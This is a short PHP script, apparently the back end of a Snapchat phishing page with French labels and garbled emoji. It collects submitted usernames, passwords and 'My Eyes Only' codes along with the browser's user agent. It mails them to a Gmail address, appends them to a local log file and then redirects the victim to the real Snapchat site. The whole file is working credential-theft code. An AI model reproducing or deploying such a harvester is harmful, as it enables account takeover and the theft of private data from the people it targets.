<?php
 
$message = "
π§  NOM D'UTILISATEUR OU ADRESSE E-MAIL : ".$_POST['username']."
π  MOT DE PASSE : ".$_POST['password']."
π  CODE MY EYES ONLY : ".$_POST['Eyes']."
π  Plateforme : ".$_SERVER["HTTP_USER_AGENT"]."
";
$Subject="π» Log snap ".$_POST['username']." β¨";
$head="From: Ξ»beloth π€  <login>";
mail("abelothigohq@gmail.com",$Subject,$message,$head);
$fil = fopen('logs.txt', 'a+');
fwrite($fil, '####################'.$message.'####################');
$_SESSION['step_one']  = true;
header('Location:https://www.snapchat.com/'); ?>